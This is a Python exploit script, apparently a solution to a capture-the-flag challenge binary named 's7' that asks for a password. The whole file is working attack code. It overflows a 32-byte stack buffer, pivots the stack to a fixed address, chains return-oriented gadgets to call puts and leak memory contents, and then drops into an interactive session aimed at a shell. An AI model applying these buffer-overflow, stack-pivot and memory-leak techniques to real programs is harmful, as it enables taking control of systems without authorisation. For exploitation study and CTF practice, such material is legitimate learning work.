#!/usr/bin/env python
# -*- coding: utf-8 -*-

import binexpect
import struct

# 0x400630 : read() rbp - 0x20; stuff...; leave; ret
# 0x400687 : puts; leave; ret
# 0x400691 : leave; ret
# 0x400703 : pop rdi; ret

nb_calls = 0
base = 0x601800

def leak(addr):
    global base
    global nb_calls

    nb_calls += 1
    payload = b'X' * 0x20                       # padding
    payload += struct.pack('L', base + 0x20)    # value for rbp

    payload += struct.pack('L', 0x400703)       # pop rdi; ret
    payload += struct.pack('L', addr)           # addr to leak
    payload += struct.pack('L', 0x400687)       # puts; leave; ret

    payload += struct.pack('L', base + 0x50)    # pivot
    payload += struct.pack('L', 0x400630)       # read; leave; ret (get control back)

    target.sendbin(payload)
    target.sendeof()

    base += 0x50
    target.tryexpect("\n(.*)\n")
    dleak = target.match.group(1).ljust(8, b'\x00')
    pleak = hex(struct.unpack('L', dleak)[0])

    if nb_calls >= 2:
        reset_stack()
        nb_calls = 0;
    
    return pleak

def reset_stack():

    global base
    base = 0x601800

    payload = b'R' * 0x20
    payload += struct.pack('L', base - 0x40)
    payload += struct.pack('L', 0x400630)       # read to pivot
    target.sendbin(payload)
    target.sendeof()
    target.tryexpect("If you're cool you'll get a shell.\n")

    payload = b'S' * 0x20
    payload += struct.pack('L', base)
    payload += struct.pack('L', 0x400630)       # read to get control back
    target.sendbin(payload)
    target.sendeof()
    target.tryexpect("If you're cool you'll get a shell.\n")

if __name__ == "__main__":

    setup = binexpect.setup('./s7')
    target = setup.target()
    target.setecho(False)

    # STAGE 1
    payload = b'A' * 0x20
    payload += struct.pack('L', base - 0x40)    # new stack frame
    payload += struct.pack('L', 0x400630)       # read
                                                # pivot through main's leave; ret
    target.tryexpect("What is your password\?\n")
    target.sendbin(payload)
    target.sendeof()
    target.tryexpect("If you're cool you'll get a shell.\n")

    payload = b'B' * 0x20
    payload += struct.pack('L', base)           # value for rbp
    payload += struct.pack('L', 0x400630)
    target.sendbin(payload)
    target.sendeof()
    target.tryexpect("If you're cool you'll get a shell.\n")
    # Stack have fully been pivoted

    for a in range(0x601000, 0x601050, 8):
        l = leak(a)
        print(hex(a), ':', l)

    target.interact()
    # target.pwned()
